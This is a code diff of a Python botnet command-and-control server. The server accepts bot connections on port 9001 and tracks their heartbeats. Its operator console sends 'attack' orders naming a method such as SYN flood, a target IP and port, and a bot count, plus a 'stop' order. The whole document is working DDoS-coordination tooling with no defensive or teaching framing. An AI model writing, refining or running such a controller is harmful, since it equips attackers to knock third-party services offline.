@@ -6,63 +6,41 @@ bots = {}
 
 def client_handler(conn, addr):
     ip = addr[0]
-    bots[ip] = {
-        "socket": conn,
-        "connected_at": datetime.now(),
-        "last_heartbeat": datetime.now()
-    }
+    bots[ip] = {"sock": conn, "connected_at": datetime.now(), "last_heartbeat": datetime.now()}
     try:
         while True:
             data = conn.recv(1024).decode()
             if data == "heartbeat":
                 bots[ip]["last_heartbeat"] = datetime.now()
-            elif data.startswith("hello"):
-                continue
-            else:
-                print(f"Received unknown message: {data}")
+            elif data.startswith("done"):
+                print(f"[DONE] {ip} -> {data}")
     except:
         pass
     finally:
-        print(f"[DISCONNECT] {ip}")
         bots.pop(ip, None)
         conn.close()
 
-def heartbeat_checker():
-    while True:
-        now = datetime.now()
-        to_remove = []
-        for ip, info in list(bots.items()):
-            delta = (now - info["last_heartbeat"]).total_seconds()
-            if delta > 10:
-                print(f"[TIMEOUT] {ip}")
-                to_remove.append(ip)
-        for ip in to_remove:
-            bots[ip]["socket"].close()
-            del bots[ip]
-        time.sleep(5)
-
 def start_server():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.bind(("0.0.0.0", 9001))
-    server.listen(100)
-    threading.Thread(target=heartbeat_checker, daemon=True).start()
-    print("[CNC] Listening on port 9001...")
+    s = socket.socket()
+    s.bind(('0.0.0.0', 9001))
+    s.listen()
+    print("C&C listening on port 9001...")
     while True:
-        conn, addr = server.accept()
+        conn, addr = s.accept()
         threading.Thread(target=client_handler, args=(conn, addr), daemon=True).start()
 
-def print_status():
-    print("\n[CNC STATUS]")
-    for ip, info in bots.items():
-        print(f"Bot {ip}, Connected at {info['connected_at']}, Last heartbeat: {info['last_heartbeat']}")
-    print(f"Total bots: {len(bots)}\n")
-
-def send_attack(target_ip, target_port, method="syn", count=5):
-    selected_bots = list(bots.values())[:count]
-    for bot in selected_bots:
+def send_attack(method, ip, port, bot_count):
+    for bot in list(bots.values())[:bot_count]:
+        cmd = f"attack {method} {ip} {port}"
         try:
-            cmd = f"attack {method} {target_ip} {target_port}"
-            bot["socket"].send(cmd.encode())
+            bot["sock"].send(cmd.encode())
+        except:
+            continue
+
+def send_stop(bot_count):
+    for bot in list(bots.values())[:bot_count]:
+        try:
+            bot["sock"].send(b"stop")
         except:
             continue
 
@@ -70,14 +48,15 @@ if __name__ == "__main__":
     threading.Thread(target=start_server, daemon=True).start()
     while True:
         cmd = input("CNC> ")
-        if cmd.startswith("status"):
-            print_status()
-        elif cmd.startswith("attack"):
-            parts = cmd.split()
-            if len(parts) != 5:
-                print("Usage: attack <method> <target_ip> <target_port> <bot_count>")
-                continue
-            _, method, ip, port, count = parts
-            send_attack(ip, int(port), method, int(count))
+        if cmd.startswith("attack"):
+            _, method, ip, port, count = cmd.strip().split()
+            send_attack(method, ip, int(port), int(count))
+        elif cmd.startswith("stop"):
+            _, count = cmd.strip().split()
+            send_stop(int(count))
+        elif cmd == "status":
+            print(f"Connected bots: {len(bots)}")
+            for ip, info in bots.items():
+                print(f"{ip} | connected at {info['connected_at']}")
         else:
-            print("Commands: status | attack <method> <ip> <port> <bot_count>")
+            print("Commands: status | attack <method> <ip> <port> <count> | stop <count>")
